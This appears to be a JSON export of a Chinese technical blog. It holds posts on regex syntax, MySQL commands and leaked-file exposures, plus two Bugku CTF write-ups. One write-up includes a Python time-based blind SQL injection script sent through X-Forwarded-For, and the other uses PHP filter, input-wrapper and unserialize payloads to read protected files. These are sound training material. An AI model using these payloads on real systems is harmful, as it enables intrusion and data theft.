匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 正则表达式模式 ^ 匹配字符串的开头 $ 匹配字符串的末尾。 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’ [^…] 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n} 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。 re{ n,} 匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。 re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式 a| b 匹配a或b (re) 匹配括号内的表达式，也表示一个组 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#…) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 (?&gt; re) 匹配的独立模式，省去回溯。 \\w 匹配字母数字及下划线 \\W 匹配非字母数字及下划线 \\s 匹配任意空白字符，等价于 [\\t\\n\\r\\f]. \\S 匹配任意非空字符 \\d 匹配任意数字，等价于 [0-9]. \\D 匹配任意非数字 \\A 匹配字符串开始 \\Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 \\z 匹配字符串结束 \\G 匹配最后匹配完成的位置。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\n, \\t, 等. 匹配一个换行符。匹配一个制表符。等 \\1…\\9 匹配第n个分组的内容。 \\10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"mysql 数据库的基本操作","slug":"mysql-数据库的基本操作","date":"2018-10-08T16:21:17.000Z","updated":"2019-05-29T12:33:43.168Z","comments":true,"path":"2018/10/09/mysql-数据库的基本操作/","link":"","permalink":"http://yoursite.com/2018/10/09/mysql-数据库的基本操作/","excerpt":"mysql 数据库的操作","text":"mysql 数据库的操作 一些常用的命令1.增加一个字段 alter table 表名字 add COLUMN 新列名 VARCHAR(20) DEFAULT NULL; //增加一个字段，默认为空 alter table user add COLUMN new2 VARCHAR(20) NOT NULL; //增加一个字段，默认不能为空 2.删除一个字段 alter table 表名字 DROP COLUMN 要删除的列名; //除一个字段 3.修改一个字段 alter table user MODIFY new1 VARCHAR(10); //修改一个字段的类型 alter table user CHANGE new1 new4 int; //修改一个字段的名称，此时一定要重新 //主键 alter table tabelname add new_field_id int(5) unsigned default 0 not null auto_increment ,add primary key (new_field_id); //增加一个新列 alter table t2 add d timestamp; alter table infos add ex tinyint not null default ‘0′; //删除列 alter table t2 drop column c; //重命名列 alter table t1 change a b integer; //改变列的类型 alter table t1 change b b bigint not null; alter table infos change list list tinyint not null default ‘0′; //重命名表 alter table t1 rename t2; 加索引 mysql&gt; alter table tablename change depno depno int(5) not null; mysql&gt; alter table tablename add index 索引名 (字段名1[，字段名2 …]); mysql&gt; alter table tablename add index emp_name (name); 加主关键字的索引 mysql&gt; alter table tablename add primary key(id); 加唯一限制条件的索引 mysql&gt; alter table tablename add unique emp_name2(cardnumber); 删除某个索引 mysql&gt;alter table tablename drop index emp_name; 增加字段： mysql&gt; ALTER TABLE table_name ADD field_name field_type; 修改原字段名称及类型： mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type; 删除字段： mysql&gt; ALTER TABLE table_name DROP field_name; mysql修改字段长度 alter table 表名 modify column 字段名 类型; 例如 数据库中user表 name字段是varchar(30) 可以用 alter table user modify column name varchar(50) ; 数据库的操作 net stop mysql //关闭msql net start mysql //开启mysql mysql -uroot -proot //登陆mysql show databases； //查看数据库 use test //切换到test数据库 show tables； //查看所有表 select * from user； //查看表中数据 desc user； //查看表结构 exit； //退出mysql客户端 create database user； //创建数据库 use user； //切换数据库 drop database user； //删除数据库 创建表： create table user（ id int， name varchar（30）， pass varchar（30） ); rename table user to user1; //修改表名 drop table user1 //删除表 insert into user(id) values(&quot; &quot;) select count(*) from user; 查询数据的总行数 asc是表示升序，desc表示降序 exit; 退出 select database(); 查询现在所在的库的名字； select vresion()； 查询Mysql的版本信息； select User(); 查询使用者的权限； select @@datadir; 查询Mysql的存储位置；","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"文件泄露","slug":"文件泄露","date":"2018-09-08T06:13:02.000Z","updated":"2019-05-29T12:33:24.136Z","comments":true,"path":"2018/09/08/文件泄露/","link":"","permalink":"http://yoursite.com/2018/09/08/文件泄露/","excerpt":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的","text":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的 .git源码泄漏原因在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 .DS_Store文件泄漏原因.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。 .hg源码泄漏原因hg是类似于git的一种分布式管理，hg初始化的时候会生成hg文件， 编辑器临时文件泄露vim编辑器vim临时文件程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。 恢复文件： 前提是.index.php.swp存在于该目录下 vim -r 恢复的文件名 vim备份文件默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；例如：index.php的备份文件则为index.php~ PHPSTORM使用phpstorm新建项目时，会生成一个.idea文件夹，这个文件夹有一个workspace.xml，访问可以得到一些信息。 网站源码备份文件泄露www.rar/nyist.tar.gz/web.zip等压缩文件名","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"bugku insert into 注入","slug":"bugku-insert-into-注入","date":"2018-05-10T15:42:22.000Z","updated":"2019-05-29T12:42:44.067Z","comments":true,"path":"2018/05/10/bugku-insert-into-注入/","link":"","permalink":"http://yoursite.com/2018/05/10/bugku-insert-into-注入/","excerpt":"INSERT INTO 注入","text":"INSERT INTO 注入 打开题目 已经给出源码 error_reporting(0); function getIp(){ $ip = &#39;&#39;; if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){ $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; }else{ $ip = $_SERVER[&#39;REMOTE_ADDR&#39;]; } $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &#39;your ip is :&#39;.$ip; $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; mysql_query($sql); 这里可以看出注入点在最后的 $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; ` $ip 可以通过 X-ForWarded-For 伪造IP 来进行http头注入 由于没有回显 也屏蔽了报错 所以只能考虑基于时间的盲注 之前时间延时盲注都是用的 if(exp1,exp2,exp3) 但是这次 他将’,’ 过滤了 $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; 所以用 case when exp1 then sleep(4) else 1 end来绕过 “,”的限制 exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制 构成的完整语句为 insert into client_ip (ip) values (&#39; 1&#39; and (case when (length((select database())) = 14) then sleep(4) else 1 end) # &#39;) 最后附上脚本： import requests url=&quot;http://123.206.87.240:8002/web15/&quot; flag=&quot;&quot; for i in range(1,6): for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;: #data = &quot;11&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; #client_ip,flag #data = &quot;11&#39; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; #flag data = &quot;11&#39; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; headers={&#39;X-ForWarded-For&#39;:data} try: result=requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag+=str1 print flag break print flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"bugku welcome to the bugkuctf wp","slug":"bugku-welcome-to-the-bugkuctf-wp","date":"2018-05-08T15:42:22.000Z","updated":"2019-05-29T12:43:01.834Z","comments":true,"path":"2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","link":"","permalink":"http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","excerpt":"welcome to the bugkuctf","text":"welcome to the bugkuctf 点击连接 之后查看源码 发现 you are not the number of bugku ! &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 发现了需要get传递三个参数 $_GET[‘txt’] === $user === “welcome to the bugkuctf” $file = hint.php 就想到了 php伪协议 文件包含漏洞 GET /test1/index.php? txt=php://input &amp;file=php://filter/read=convert.base64-encode/resource=hint.php &amp;password= POST welcome to the bugkuctf 可以读出来 hint.php &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 同理 也可以读出index.php的代码 &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;?????????????????????flag???&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; hint.php 提示的flag.php 从index.php可以看到对关键词flag进行了preg_match 所以不能直接读出代码内容 hint.php 定义的是一个类 注意到中间有一个__tostring方法， 这个函数就是把类当作字符串执行时会自动执行的一个函数。 __tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开 将hint.php中的Flag方法当做字符串执行时，会自动执行__tostring方法，只有echo，只能输出一个或多个字符串，所以构造password为Flag类型，其中的string变量flie=flag.php即可 看到了代码中有 include($file); $password = unserialize($password); echo $password; 因此知道需要构造序列化对象payload为 GET /test1/index.php?txt=php://input &amp;file=hint.php &amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} POST welcome to the bugkuctf 就可得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]}]}